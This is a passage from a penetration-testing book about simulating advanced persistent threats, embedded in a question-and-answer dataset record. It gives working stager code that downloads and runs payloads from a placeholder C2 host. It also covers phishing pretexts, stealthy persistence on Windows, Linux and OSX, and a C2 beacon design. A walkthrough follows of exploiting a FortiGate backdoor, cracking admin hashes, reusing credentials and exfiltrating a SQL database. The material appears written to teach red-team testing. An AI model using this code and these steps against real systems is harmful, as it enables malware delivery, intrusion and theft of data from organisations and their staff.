new\nBufferedInputStream(link.openStream());\nByteArrayOutputStream out = new ByteArrayOutputStream();\nbyte[] buf = new byte[1024];\nint n = 0;\nwhile (-1!=(n=in.read(buf)))\n{out.write(buf, 0, n);\n}\nout.close();\nin.close();\nbyte[] response = out.toByteArray();\nFileOutputStream fos = new FileOutputStream(fileName);\nfos.write(response);\nfos.close();\nProcess process = new ProcessBuilder(\"c2.exe\").start();\n} catch(IOException ioe){}\n} else if (isMac()) {\ntry {\nString fileName = \"c2_signed_mac_binary\";\nURL link = new\nURL(\"http://yourc2url.com/c2_signed_mac_binary\");\nInputStream in = new\nBufferedInputStream(link.openStream());\nByteArrayOutputStream out = new ByteArrayOutputStream();\nbyte[] buf = new byte[1024];\nint n = 0;\nwhile (-1!=(n=in.read(buf)))\n{out.write(buf, 0, n);\n}\nout.close();\nin.close();\nbyte[] response = out.toByteArray();\nFileOutputStream fos = new FileOutputStream(fileName);\nfos.write(response);\nfos.close();\nProcess process = new\nProcessBuilder(\"c2_signed_mac_binary\").start();\n} catch(IOException ioe){}\n} else if (isLinux()) {\ntry {\nString fileName = \"linux_binary\";\nURL link = new\nURL(\"http://yourc2url.com/c2_signed_mac_binary\");\nInputStream in = new\nBufferedInputStream(link.openStream());\nByteArrayOutputStream out = new ByteArrayOutputStream();\nbyte[] buf = new byte[1024];\nint n = 0;\nwhile (-1!=(n=in.read(buf)))\n{out.write(buf, 0, n);\n}\nout.close();\nin.close();\nbyte[] response = out.toByteArray();\nFileOutputStream fos = new FileOutputStream(fileName);\nfos.write(response);\nfos.close();\nProcess process = new ProcessBuilder(\"chmod +x\nlinux_binary;./linux_binary\").start();\n} catch(IOException ioe){}\n} else {\n}\n}\npublic static boolean isWindows() {\nreturn (OS.indexOf(\"win\") >= 0);\n}\npublic static boolean isMac() {\nreturn (OS.indexOf(\"mac\") >= 0);\n}\npublic static boolean isLinux() {\nreturn (OS.indexOf(\"nux\") >= 0);\n}\n}\nWe first use the System.getProperty(\"os.name\") function to determine the\nOS. While you could drill down a little more (for other versions of UNIX for\nexample), this is sufficiently thorough for your needs. Once the OS is known,\nthe stager downloads and executes the appropriate payload for that platform.\nThe variable filename defines where the payload will be written on the host\nand the variable URL references where the stager can find the payload on the\nweb.\nMake sure you also code sign the Mac executable or you will get inconvenient\npermission messages presented to the user. No such issues exist with\nWindows and Linux; they will quite happily execute what they're given with\nno warnings to the user.\nTo convert this to an applet, you need to import the appropriate library:\nimport java.applet.Applet;\nand change:\npublic class JavaStager {\nto:\npublic class JavaStager extends Applet {\nPackage the .class file to a .jar:\njar cf stager.jar JavaStager.class\nand prepare your HTML:\n<HTML>\n<HEAD>\n<TITLE> Convincing Pretext </TITLE>\n</HEAD>\n<BODY>\n<applet code=JavaStager.class\narchive=\"stager.jar\"\nwidth=120 height=120>\n</applet>\n</BODY>\n</HTML>\nCreate a Convincing Pretext\nYou will need to have a think about where you want these files to be\ndownloaded. In the previous example (when converted into an applet), they\nwill go to the Java cache, which is far from ideal.\nYou still have two things you need to do—create a convincing pretext (i.e., a\npretty and believable website) and sign the .jar file. Then this attack will be\nready to fly.\nThe sky is pretty much the limit as to how far you can go when designing\npretexts, but bear in mind here that an attack is successful or foiled—far more\nthan with the technical details.\nI encourage you to do your research and be an artist.\nIn this instance, you'll create a website with the house style of the college\nunder attack, embed your hostile applet in it, and entice your targets to visit\nthe site. It has to look official, but official emails land in people's inboxes all\nday long, so it's also has to stand out without looking like it's from a Nigerian\nprince. Without wanting to sound like a psychopath, manipulating people is\neasy when you know what makes them tick. In the cut-throat world of sales or\nbrokering stocks, anything that appears to give someone an advantage over\ntheir colleagues works well but, all things being equal, academics are not\nusually motivated by the acquisition of wealth.\nIt doesn't matter if you're a physicist or an archaeologist, the real currency in\nthe academic world is prestige. “Publish or perish” is the phrase coined to\ndescribe the pressure in academia to rapidly and continually publish work to\nsustain or further one's career. That is leverage that you can use. Another\npretext that works very well is flattery—create an attack that exploits these\nideas and get your payload executed.\nCreate a website called “Find an expert,” which you will imply is associated\nwith and administered by the university. It will purport to be a new directory\nthat will make it easier for specialists to get invitations to speaking\nengagements and the like. All that's needed is a free registration. The invite\nwill be personalized and made to look like it's originated from within the\ncollege. You can send an email under any pretext to anyone at the college and\nwhen they reply, you will have the standard university email footer that you\ncan copy and customize to suit your needs.\nEMAIL FORGERY\nForging email is so trivial that I don't to waste space here discussing it.\nAlthough I touch on advanced topics such as SPF, DKIM, and other email\ndomain protection technologies later in the book. If you're unfamiliar\nwith email forgery, there are many resources on the web to refer to, but\nI'd start with the latest IETF RFC on SMTP email:\nhttps://tools.ietf.org/html/rfc6531\nSigning the Stager\nThat leaves code signing the stager. Once we've acquired the certificate from\nthe vendor, the easiest way to do this is as follows.\nExport the PVK (private key) and SPC (certificate) files into a PFX/P12 file\nusing the Microsoft tool pvkimprt.\npvkimprt -import -pfx mycert.spc javakey.pvk\nImport the PFX file into a new Java keystore using PKCS12Import and enter\nthe keystore password when prompted.\njava pkcs12import mycert.pfk keystore.ks\nSign the .jar file with the jarsigner tool.\njarsigner -keystore keystore.ks stager.jar\nEmbedded into your fake website, this attack is ready to test. (And do test,\nreally, because if you mess up your initial attack, your target will be more\naware and on guard. Then test it again.)\nNotes on Payload Persistence\nIn the previous chapter I discussed, albeit briefly, the idea of persistence—that\nis the payload being able to survive reboots. There are numerous ways to do\nthis, and now that we're dealing with multiple operating systems the problem\nmultiplies. The method described in Chapter 1 will work but it's not very\nstealthy. Now that you're upping your game, it seems like a good time to\nrevisit the concept with some better suggestions.\nMicrosoft Windows\nThere are plenty of ways to autostart code in Windows that go beyond the\nobvious and the most common:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nMicrosoft included several keys that were originally intended only for testing\nbut which never got removed; you can execute code from there in the same\nway:\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File\nExecution Options\nor\nHKLM\\Software\\Wow6432Node\\Windows NT\\CurrentVersion\\Image File\nExecution Options\nWhen using the Registry (or indeed any autostart method), it is a good idea to\nfake the timestamp on the executable to make it look like it's been there for a\nlong time rather than suddenly appearing on the day of a suspected attack.\nI've seen very experienced forensic analysts blunder past malware because it\ndidn't occur to them that the timestamp could easily be changed.\nServices are a very popular way of installing malware. Your .exe will need to\nbe specially compiled as a Windows service if hiding this way or the OS will\nkill it.\nAnother way is to have your stager drop a DLL instead of an EXE and\nreference it from a Registry key using rundll32:\nRUNDLL32.EXE dllnameentrypoint\nOn that note, it's possible to store and run JavaScript in the Registry:\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\n\";alert('Boo!');\nMalware has been seen in the wild that uses this method to store a payload in\nthe Registry itself.\nHowever, rather than listing the many ways you can go persistent on\nWindows, I recommend acquiring the free Microsoft sysinternals tool\nAutoruns:\nhttps://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx\nThis magnificent utility contains the largest database of autorun methods in\nexistence (for more than the simple Registry tricks mentioned here) and is\nused in forensic and malware analysis engagements. It knows some really\narcane stuff.\nOne method that I like and that is generally sound includes replacing an EXE\nreferenced by an existing Registry key with your payload and then instructing\nyour payload to execute the original code you replaced. This is best done\nmanually, as trying to automate this can produce interesting results.\nWhen hiding payloads, it's best to pick a name that doesn't arouse suspicion\n(i.e., payload.exe). Svchost.exe and spoolsv.exe make the best targets\nbecause there are usually several copies running in memory. One more will\noften go unnoticed.\nIt's worth mentioning that most malware authors do not balance the benefits\nof persistence over time with the increased chances of detection. Forensic\nanalysis often focuses on persistence to find payloads.\nLinux\nThere is a belief that persistence on Linux (and indeed UNIX systems\ngenerally) tends to be more involved than on Windows. The reason for this\nerroneous belief is that *nix user permissions are (compared to Windows)\nenforced in a more rigorous way by default. It's not uncommon for Windows\nusers to have access to far more of the Registry than they require. However,\nunless your user is running as root (or you can persuade them to run your\ncode as root), then persistence is going to be limited to the executing user and\nas a result that user's permissions. That's not a massive problem, though;\nthere are plenty of ways to escalate user privileges once you're installed and\nyou can still do a lot of network exploration as a humble user. Generally,\nthough, you won't be able to clean logs as you go and that's not ideal, although\nlogging (or paying any attention to logs) is less likely on a workstation build.\nI discuss privilege escalation in due course and, generally speaking, gaining\nlocal administrative access on your beachhead machine is going to be a\npriority when modeling an APT. There is a school of thought that without root\nprivileges, persistence should be avoided as it is insufficiently stealthy.\nThere are a various startup methods available in Linux-based operating\nsystems. As already discussed, some require elevated privileges and some do\nnot.\nServices\nIn Linux, there are three ways of installing and running applications as\nbackground processes (or daemons). The benefit of using services is that the\nOS will restart your process if it dies. These are:\nSystem V init\nUpstart\nsystemd\nSystem V or classic init is rarely encountered today and is only of interest in\nolder Linux distributions such as:\nDebian 6 and earlier\nUbuntu 9.04 and earlier\nCentOS 5 and earlier\nYou will need to create a functional Bash init script at /etc/init.d/service.\nExamples of existing scripts can be found in the /etc/init.d directory.\nThen run:\nsudo update-rc.d service enable\nThis will create a symlink in the runlevel directories 2 though 5. Now you\nneed to add the following respawn command in /etc/inittab:\nid:2345:respawn:/bin/sh /path/to/application/startup\nThen stop and start the service:\nsudo service service stop\nsudo service service start\nUpstart is another init method, and was introduced in Ubuntu 6. It became\nthe default in Ubuntu 9.10, and was later adopted into Red Hat Enterprise 6\nand its derivatives. Google Chrome OS also uses Upstart.\nUbuntu 9.10 to Ubuntu 14.10, including Ubuntu 14.04\nCentOS 6\nWhile still frequently seen, it is generally being phased out in favor of\nsystemd, which we'll look at next.\nTo run as a service, your payload will need a configuration script in /etc/init\ncalled servicename.conf. Again, you can easily model your script using an\nexisting configuration file. Make sure, however, that your service.conf\ncontains the following lines:\nstart on runlevel [2345]<br>respawn\nThis ensures the code runs on boot and will respawn if it dies.\nsystemd is a system and service manager for Linux that has become the de\nfacto initialization daemon for most new Linux distributions. systemd is\nbackward-compatible with System V commands and initialization scripts.\nMake sure the service has a functional systemd init script located at\n/etc/systemd/system/multi-user.target.wants/service.service\nStart the service:\nsudo systemctl enable service.service\nThe /etc/systemd/system/multi-user.target.wants/service.service file\nshould also contain a line like\nRestart=always\nunder the [Service] section of the file to enable the service to respawn after a\ncrashs/service.service.\nCron\nCron is a utility used to start processes at specific times, much like Task\nScheduler in Windows. It's useful for complex timing notations and can be\nused by users without root access to schedule tasks.\nInit Files\nUpon login, all Bourne-compatible shells source /etc/profile, which in turn\nsources any readable *.sh files in /etc/profile.d/. These scripts do not\nrequire an interpreter directive, nor do they need to be executable. They are\nused to set up an environment and define application-specific settings.\nGraphical Environments\nThere are various desktops and window managers in Linux of which KDE and\nGnome are still the most popular. These environments all have their own\nindividual ways to start code when they are booted that are far too numerous\nto list here.\nRootkits\nThe definition of rootkit varies, but is generally a binary on the target system\nthat has been replaced by malicious code yet retains the functionality of the\noriginal. In the past, certain simple services (such as finger) would be\nmodified to contain code that would grant an attacker access when interfaced\nwith in a specific way. As Linux-based operating systems are open source, the\npossibilities for such attacks are limited only by your imagination, although\nthis attack falls more into the category of backdoor rather than straight\npersistence.\nOSX\nApple OSX is by far the most secure platform here. Borrowing from its iOS\noperating system, it now checks all binary signatures, meaning that it\nbecomes impossible to subvert existing processes and prevents attacks such\nas process migration. However, unlike iOS, unsigned apps are allowed to run\nfreely.\nPersistence can be achieved through cron jobs as with Linux but there are\nbetter ways. The first user-mode application to boot in OSX is launchd. It can\nbe abused to obtain persistence as follows:\n# echo bsexec 1 /bin/bash payload.script > /etc/launchd.conf\nA deprecated method (that still works) is using startup items.\nYou need to place two files into a startup item directory. The first is the script\nthat is to be executed automatically. The other file must be named\nStartupParameters.plist and must contain a Provides key that contains the\nname of the script file. Both of these files should be placed in a sub-directory\nin either the /System/Library/StartupItems or /Library/StartupItems\ndirectory. The name of the sub-directory must be the same as the name of the\nscript file (and the value of the Provides key in the\nStartupParameters.plist).\nCommand and Control Part 2: Advanced Attack\nManagement\nThe C2 infrastructure described in Chapter 1 is not fit for anything other than\nillustrating concepts. Its lack of a proper out-of-band management channel\nand the ability to handle only one target host at a time are severe, crippling\nlimitations. The always-on SSH connection is also inelegant and lacks stealth.\nAdding Stealth and Multiple System Management\nIn this section, you will add considerable new functionality to make your C2\nstealthier, more intelligent, and easier to manage. What is needed for now is\nthe following:\nBeaconing—When the payload is delivered and installed, it should\nperiodically call home (your C2 server) for orders rather than immediately\nestablishing an SSH connection and reverse tunnel.\nPre-configured command set—An established set of instructions that can\nbe passed to the payload for tasking when it calls home.\nTunnel management—The C2 server needs to be able to handle multiple\nsimultaneous inbound connections from payloads on different hosts and\nbe able to stage reverse tunnels on multiple ports while keeping track of\nwhich tunnel belongs to which port.\nWeb-based frontend—Your additional functionality will require a coherent\ninterface for both strategic and tactical attack management.\nFor example, your new setup illustrates the move to a beacon model, as\nshown in Figure 2.3.\nFigure 2.3: The upgraded framework handles multiple hosts and operating\nsystems.\nLet's look at what will be required for this implementation.\nA beacon is simply an HTTP(S) packet carrying XML data. This data contains\ninformation about your host and looks like this:\n<Beacon>\n<HostName> </HostName>\n<InternalIP> </InternalIP>\n<ExternalIP> </ExternalIP>\n<CurrentUser> </CurrentUser>\n<OS></OS>\n<Admin></Admin>\n</Beacon>\nThis is straightforward and easily extensible. The beacon is transmitted by the\npayload according to a pre-configured interval. The default is 60 seconds but\nthis can be altered when the payload goes live. For a low and slow attack,\nlonger intervals can be set, effectively putting the payload to sleep for\nextended periods of time should such additional stealth be required. A\npopulated XML packet will look like this:\n<Beacon>\n<HostName> WS-office-23 </HostName>\n<InternalIP> 192.168.17.23 </InternalIP>\n<ExternalIP> 209.58.22.22 </ExternalIP>\n<CurrentUser> DaveR </CurrentUser>\n<OS> Windows 7 </OS>\n<Admin> N </Admin>\n</Beacon>\nThe response to this packet is also contained in XML:\n<BeaconResponse>\n<Command1> </Command1>\n<Command1Param> </Command1Param>\n<Command2> </Command2>\n<Command2Param> </Command2Param>\n<Command3> </Command3>\n<Command3Param> </Command3Param>\n<Command4> </Command4>\n<Command4Param> </Command4Param>\n<Command5> </Command5>\n<Command5Param> </Command5Param>\n</BeaconResponse>\nCommands can be stacked in the web interface indefinitely and will all be\nexecuted when the payload calls home after its configured sleep period.\nImplementing a Command Structure\nThe commands you want to implement at this stage are:\nSleep—Alter the interval in which the payload calls home. The default is\n60 seconds. The parameter to this is the interval in seconds.\nOpenSSHTunnel—This will establish an SSH connection back to the C2\nserver, start a local SSH server, and initiate a reverse tunnel allowing C2 to\naccess the target's file system. The parameter is the local (target) port\nfollowed by the port on the C2 to forward to in the format LxxxCxxx.\nTherefore the parameter is the port on the C2 that the tunnel will be\naccessible on and local port to start the SSH server on: L22C900.\nClose SSHTunnel—If an SSH tunnel and server are running, they will be\nstopped. No arguments need be passed.\nOpenTCPTunnel—This will establish an SSH connection back to the C2\nserver and open a reverse tunnel to any port on the target for accessing\nlocal services. The parameter is the local (target) port following by the port\non the C2 to forward to in the format LxxxCxxx. For example, to forward to\na local FTP server and make it available on port 99, you use L21C99.\nCloseTCPTunnel—This is obvious. The parameter is the local (target) port.\nOpenDynamic—This will establish an SSH connection back to the C2 server\nand open both a dynamic tunnel and a reverse TCP tunnel pointing to it.\nThis effectively turns your target into a SOCKS5 proxy server and is a great\nway to pivot your attack into your target's network. The parameter is the\nOpenTCPTunnel.\nCloseDynamic—Again this is obvious. The parameter is the local (target)\nport.\nTask—Download an executable from the web and execute it. The\nparameter is the URL to file.\nBy way of example, the following packet will download and execute an EXE\nfrom the web, pivot into the target network using a SOCKS5 proxy, and start\nan SSH server on port 22, reversed back to the C2 on port 900.\n<BeaconResponse>\n<Command1> Task </Command1>\n<Command1Param>\nhttp://the.earth.li/~sgtatham/putty/latest/x86/putty.exe\n</Command1Param>\n<Command2> OpenDynamic </Command2>\n<Command2Param> L1080C1080 </Command2Param>\n<Command3> OpenSSHTunnel</Command3>\n<Command3Param> L22C900 </Command3Param>\n</BeaconResponse>\nFor the web interface and backend, you need something to process the XML,\nstore current attack data, and adequately visualize the mission. There are so\nmany technologies available to achieve this, so the best recommendation is to\ngo with what you're comfortable with. That being said, all decent scripting\nlanguages have libraries that allow you to create a simple web application like\nthis quickly and easily.\nBuilding a Management Interface\nMy preference is to use the following, but that is born out of habit rather than\na personal endorsement:\nWeb server—I like tinyhttpd. It's open source and has a very small\ndeployment footprint.\nScripting language—Python is my choice though there are certainly easier\nways to handle web-related tasks in Ruby.\nDatabase—I prefer PostgreSQL. Once upon a time I would have said\nMySQL, but no longer. I don't want to get into a rant on the subject, but\nOracle has just destroyed too many things that I loved.\nAs for a user interface, I like to keep things simple, but bear in mind that you\nwill need the following:\nA way of tracking hosts as they beacon in real-time. That frame in the\ninterface should use AJAX functionality or equivalent so that when the\napplication receives a new beacon, it is immediately visible and ready for\ntasking. Each host should display the last time in seconds that it received a\nbeacon.\nEach host should display all the information received from the beacon\npacket, such as IPs, hostnames, etc.\nNext to each host you will want to track which ports are currently open\nand which hosts they are assigned to. All of this information should be\nhandled by the web application—it is not desirable to have the web\napplication and the C2 SSH server interact.\nYou may want to write a function to periodically check the status of open\ntunnels and mark closed any that have died.\nYou will need to have a way to stack commands for each host and record\nwhich commands have been executed.\nIt is inevitable that, as you work on implementing your C2 infrastructure, you\nwill want to do things differently and find more creative ways of solving\nproblems. This is to be encouraged.\nThe Attack\nAt this point you have a valid payload, a pretext, and a delivery mechanism.\nNow you can mass mail your invitation to the targets using forged email\ncredentials.\nUSING A TRANSACTIONAL EMAIL PROVIDER\nCreating an SMTP script to handle the delivery is trivial, but you may\nwant to use a transactional email provider to handle the actual delivery.\nThere are many to choose from. The reasons for this are that due to spam,\nthe receiving mail server may not adequately trust your IP address for\nmail delivery. There are a few providers out there and most will let you\ncreate a trial account lasting a month or a certain amount of mails\n(usually in the low thousands, so perfect for our needs). Most have the\noption of embedding web bugs in the mail so you can see when they've\nbeen opened. Make sure you never use the same IPs for mail delivery and\nC2. It would be a shame to have your command and control infrastructure\nblocked by anti-spam rules.\nEither way, assume that:\nYour email pretext has been sent to the targets.\nSome will have visited your website.\nOne or more will have run our Java applet and are now tied into your C2\ninfrastructure.\nYour payload is persistent.\nSituational Awareness\nThe first and most important task is to ascertain exactly where you are in a\ntarget's network and what privileges you have. You can then begin mapping\nthe network, its assets, and its users, and you can figure out where you need\nto be in relation to where you are.\nWARNING\nAvoid inadvertently breaking the law.\nDo note that at least one target will have viewed your website from their\nhome machine and that is now infected with your payload. This can usually be\nquickly ascertained by the internal and external IP address. This does not\nmean that they should be completely discounted, as they may have VPN\nconnectivity or other work-related data; however, you will be in a legal gray\narea in this instance. I like completing a successful mission but I also very\nmuch like not being in prison.\nIn this instance, there is a successful penetration of the social sciences\ndepartment.\nWe ascertain this by querying the Active Directory and downloading the entire\nhost list. This won't be complete and will only contain Windows machines\nfrom 2000 onward, but it's more than enough to build a target list and figure\nout who is where.\nUsing AD to Gather Intelligence\nHow do you achieve this? Well, once upon a time I would be giving you a list\nof tedious Windows net commands to type. However, there are thankfully\nbetter, quicker ways. Add the following to your tools:\nhttps://github.com/PowerShellEmpire/PowerTools\nThis “is a collection of PowerShell projects with a focus on offensive\noperations” and it has completely changed the way I approach situational\nawareness during APT modeling and internal penetration testing. It's part of\nthe overall Veil project and a must-have. One of the tools, PowerView, can be\nused to query the AD in a number of ways. We'll use it to grab all the hosts in\nthe internal domain:\nc:> powershell.exe -nop -exec bypass\nPS c:> import-module .\\powerview.ps1\nPS c:> Get-NetComputer -FullData | Out-File -encoding ascii\nmachines.txt\nThis gives you significant information on every machine in the AD. As an\nexample, some of the pertinent information retained for each host is shown\nhere:\nmemberof :\nCN=GL_APP_VisioPro2010,OU=Applications,OU=Secur\nityGroups,OU=coll-domain,DC=uk,DC=coll-\ndomain,D\nC=local\npwdlastset : 21-2-2016 21:43:09\nlastlogon : 24-2-2016 22:24:50\nwhenchanged : 21-2-2016 21:17:33\nadspath : LDAP://CN=SOCSCI12-\nWS7,OU=Support,OU=Computers,O\nU=coll-domain,DC=uk,DC=coll-domain,DC=local\nlastlogontimestamp : 21-2-2016 22:17:18\nname : SOCSCI12-WS7\nlastlogoff : 1-1-1601 1:00:00\nwhencreated : 15-12-2014 9:15:47\ndistinguishedname : CN=SOCSCI12-\nWS7,OU=Support,OU=Computers,OU=Secur\neLinkuk,DC=uk,DC=coll-domain,DC=local\nbadpwdcount : 0\noperatingsystem : Windows 7 Professional\nAnalyzing AD Output\nFrom this output, you can determine the host-naming convention, operating\nsystem, and other helpful information. You could ask PowerView just to\nreturn hostnames and even ping which hosts are up, but that will create a lot\nof traffic that you want to avoid. Perusing the output:\nsamaccountname : medlab04-WS12$\nadspath : LDAP://CN=medlab04-\nWS12,OU=Computers,OU=MedicalR\nesearch,\nlastlogontimestamp : 21-2-2016 18:54:24\nname : medlab04-WS12\ndistinguishedname : CN=medlab04-\nWS12,OU=MedicalResearch,OU=Computers\ncn : medlab04-WS12\noperatingsystem : Windows 7 Professional\nif you ping medlab04-WS12, you get:\nPinging medlab04-WS12 [10.10.200.247] with 32 bytes of data:\nReply from 10.10.200.247: bytes=32 time<1ms TTL=126\nReply from 10.10.200.247: bytes=32 time<1ms TTL=126\nReply from 10.10.200.247: bytes=32 time<1ms TTL=126\nReply from 10.10.200.247: bytes=32 time<1ms TTL=126\nYour host is up and it's a pretty good guess that all the Medical Research\nmachines are going to be in the same subnet. Looking at all the machines\nusing the medlab naming convention referenced in the AD output:\nmedlab04-WS13\nmedlab04-WS07\nmedlab04-WS11\nmedlab04-WS10\nmedlab04-WS04\nmedlab04-WS08\nmedlab04-WS15\nmedlab04-WS02\nmedlab03-WS06\nmedlab03-WS16\nmedlab03-SQL\nmedlab03-FTP\nyou can see that they are contained in 10.10.200.0/24. It looks like they're all\nworkstations except for two and it's a pretty good guess that these are an FTP\nand MS SQL server, respectively.\nThe workstations are all likely to be derived from a common recent build\nimage. It's unlikely we'll find exploitable services or weak accounts. However,\nthese machines are the only ones contained in the AD. The other computers\nthat could be in this range are not because they're not running Windows and\nwill therefore not necessarily be subject to the scrutiny of the organization as\na whole as well as not part of its enforced security policy. A quick ping scan\nreveals the following:\n10.10.200.1\nOnly one host. That is disappointing, as it's almost certainly going to be the\nrouter for the local subnet.\nAttack Against Vulnerable Secondary System\nWe confirm this is the case by connecting to it via SSH. It presents the\nfollowing banner:\nFortiGate OS Version 4.8\nIt's not just a router, it's a firewall. Not only that, it's a firewall that shipped\nfrom the manufacturer with a hardcoded password. Some suspicious folk\nmight call this a “backdoor,” but the manufacturer shrugged it off as a “device\nmanagement issue.”\nEither way, there is public exploit code for the issue available from here:\nhttp://seclists.org/fulldisclosure/2016/Jan/26\nWe'll use this script to compromise the router. Once you have done this, you\ncan list the admin users:\n# get system admin\nname: admin\nname: DaveGammon\nname: RichardJones\nand download their password hashes one by one:\n# show system admin admin\nset password ENC AK1VW7boNstVjM36VO5a8tvBAgUJwLjryl1E+27F+lOBAE=\nFG100A # show system admin DaveGammon\nset password ENC AK1OtpiTYJpak5+mlrSoGbFUU60sYMLvCB7o/QOeLCFK28=\nFG100A # show system admin RichardJones\nset password ENC AK1P6IPcOA4ONEoOaNZ4xHNnonB0q16ZuAwrfzewhnY4CU=\nFortigate stores its passwords as salted but non-iterated SHA-1 hashes. In\nlayman's terms, that means you can crack them. Copy and paste the config to\nyour local machine and use the free HashCat password cracker to crack the\nhashes as it natively supports this format:\nroot@kali:/tmp# hashcat -a 0 -m 7000 med-fort\n/usr/share/wordlists/rockyou.txt\nInitializing hashcat v0.47 by atom with 8 threads and 32mb segment-\nsize…\nAdded hashes from file fortinet: 3 (3 salts)\nNOTE: press enter for status-screen\nAK1P6IPcOA4ONEoOaNZ4xHNnonB0q16ZuAwrfzewhnY4CUA:SecurePass#1\nAK1OtpiTYJpak5+mlrSoGbFUU60sYMLvCB7o/QOeLCFK28A:IloveJustinBieber\nInput.Mode: Dict (/usr/share/wordlists/rockyou.txt)\nIndex…..: 5/5 (segment), 553080 (words), 5720149 (bytes)\nRecovered.: 2/3 hashes, 2/3 salts\nSpeed/sec.: 8.10M plains, 8.10M words\nProgress..: 553080/553080 (100.00%)\nRunning…: --:--:--:--\nEstimated.: --:--:--:--\nHere I am using the rockyou.txt wordlist, which contains 14 million words.\nThis crypt-and-compare attack hashes every single word and compares it to\nthe hashes; when you have a match that word is the password.\nLooking at the output, two passwords have been found.\nCredential Reuse Against Primary Target System\nI don't care much about the firewall itself, other than that I can add a firewall\nruleset allowing you to access the Medical Research lab and that these\npasswords may be used elsewhere. What I really want to access is the MS SQL\ndatabase, which will most likely be running on its default port 1433.\nWe can use a Windows command-line tool to test the stolen credentials and\nsee if they work on the SQL Server, but first you want to query AD again to\nfind out what Dave Gammon's domain username is. For that, I will once again\nturn to the magic of PowerView:\nc:> powershell.exe -nop -exec bypass\nPS c:> import-module .\\powerview.ps1\nPS c:> Get-NetUser -FullData | Out-File -encoding ascii users.txt\nAfter searching the output, I find the line we're looking for:\nsamaccountname: dgammon\nWell. I could probably have guessed that, but moving on, let's test those\ncredentials. If they work, this will list the databases available.\nsqlcmd -s medlab03-SQL -u coll-domain/dgammon -p ILoveJustinBieber -q\n\"exec sp_databases\"\nA hit and a list of DBs:\nmaster\nmodel\nmsdb\nperfuse-data\ntempdb\nThe list shows four MS SQL databases and one user db called perfuse-data.\nThat sounds promising. So let's steal it. The following command will back up\nthe perfuse-data db to disk, where you can extract it via C2:\nsqlcmd -s medlab03-SQL -u coll-domain/dgammon -p ILoveJustinBieber -Q\n\"BACKUP DATABASE perfuse_db TO DISK='C:\\perfuse_db.bak'\"\nThat is game over. I have acquired our target's database, which is more than\nsufficient to call this a win. In an actual APT scenario, I would have used\nthese credentials to gain further access to the workstations, deployed spyware\nas well as my own C2, and stolen every idea these guys came up with.",
    "question": "What is the key difference between an Advanced Persistent Threat (APT) and a traditional intrusion in terms of the attacker's approach and objectives?",
    "summary": "The text discusses advanced penetration testing techniques to simulate targeted attacks like APTs, emphasizing the need for realistic, stealthy methods to bypass traditional security measures. It explains how to use VBA macros and Java applets to deliver payloads, establish command and control (C2) infrastructure, and maintain persistence on various platforms. The text also highlights the importance of social engineering and situational awareness in such attacks, and warns against relying on compliance or outdated security practices. It provides detailed examples of how to create and deploy C2 systems, including using SSH for secure communication, and outlines the challenges of detecting and countering APTs in modern environments."
  },
  {
    "start": 19,
    "end": 31,
    "text": "Summary\nIn this chapter, I introduced a new vector of attack—the Java applet. We've\nextended our C2 and put it to the test. Once you're inside a target's network,\nyou have effectively bypassed 90 percent of operation security. In this case,\nthe target had implemented a firewall to block their subnet from the rest of\nthe network, but it was vulnerable and easily subverted to give the very keys\nto the kingdom. This is worth stressing because credential reuse is a killer\nwhen one of those systems is not as secure as the other.\nWhat we have here is a belief that someone running in the browser is secure\nand harmless. That Java is “secure”—I keep hearing that but I'm not sure\nwhat it means. Allow a Java applet to run in your browser and you are\nrunning executable code on your computer as surely as if you downloaded an\n.exe. Code signing is meaningless in the twenty-first century and should not\nbe relied upon for security here or anywhere else.\nDespite the plethora of tools capable of “detecting Command & Control,” you\nshould realize that you can easily make homegrown attacks, customized for a\nspecific mission that will not be detected.\nThe next chapter looks at compromising banking systems and advanced data\nexfiltration.\nExercises\n1. Continue implementing the C2 and experiment with the features\ndiscussed.\n2. Investigate what other technologies run within a web page context and\nhow they might be similarly utilized to gain initial access into an\norganization.\n3. A mass email was used in this chapter, but some spam filters would have\nblocked it—in fact, that is often the biggest problem when using email as a\nvector of attack. What other technologies could be used to deliver the URL\nto these targets in a convincing manner?\nChapter 3\nTwenty-First Century Heist\nThis chapter is based on a consulting engagement I performed a couple of\nyears ago for a large international bank. They had never conducted this kind\nof pen test before, but I'd done a lot of other testing for them in the past so we\nhad a sit-down to talk about what would be a good approach.\nA bank has money. It's kind of the motherlode. Money is not only the asset to\nbe protected but the resource that makes that protection possible. Banks\nprioritize security at every step, in a way that other organizations simply\ncannot: every build change in any technology, be it a web or mobile\napplication, is reviewed both as a penetration test and a line-by-line code\nreview. Every IP of every external connection is subjected to penetration\ntesting once a year.\nWhat Might Work?\nMost users won't have web-to-desktop access and those who do will find it\nheavily restricted—a VBA macro might make it into a target's inbox but will\nprobably be blocked or the attachment will be deleted by policy regardless of\nAV hits. A signed Java applet might run in a target's browser but more likely it\nwill be considered a banned technology and blocked at the web proxy. Physical\naccess to the facilities is heavily restricted, and every person in or out will\nneed an electronic access badge. Physical access control only permits one\nperson through at a time with ground sensors capable of determining if more\nthan one individual is trying to enter on a single badge.\nA HISTORICAL DIVERSION\nThe first penetration test I ever carried out was a banking website. It was\nApril 20, 1999. I was 23. I remember the date vividly, not because the test\nwas especially interesting or educative—it was neither—but because the\nday was somewhat over shadowed by the events at Columbine High\nSchool, which (at the time) was the deadliest school shooting in U.S.\nhistory. The two events have therefore always been inextricable in my\nmind.\nNothing Is Secure\nSo, we're out of luck, right? Remember when I said that nothing is secure?\nWell, that applies to banks as well. The people who write code or design\nnetwork architecture for banks are as fallible as anyone else. Not all\npenetration testers are created equal and security code reviews are often\nnothing but an expensive waste of time to satisfy the compliance officer and\nare performed by people who can't even code in the language they're supposed\nto be reviewing. If you think I'm joking, next time you pay $2,000 a day for\nsomeone to come in and conduct a security code review, ask them to write a\nsimple program in the relevant language. You'll get a blank look and an\n“explanation” as to why they use a “special” tool. Then tell them they can\nblame me for making them look stupid.\nOrganizational Politics\nAnother problem is that banks are usually broken into little fiefdoms—this is\ntrue of many organizations but particularly true in banking. There's not just\none IT department or one team of coders. The people writing the consumer\niPhone app have probably not even met the people who wrote the comparable\nretail website application.\nLOOK BOTH WAYS BEFORE CROSSING A ONE-WAY\nSTREET\nPeople don't necessarily fully understand the environments that they are\nmanaging. For example, I once performed a penetration test of a bank's\nATM network and the guy running the lab had been there five years and\nassured me that the testing environment was separate from the\nproduction network so I needn't worry about taking down live 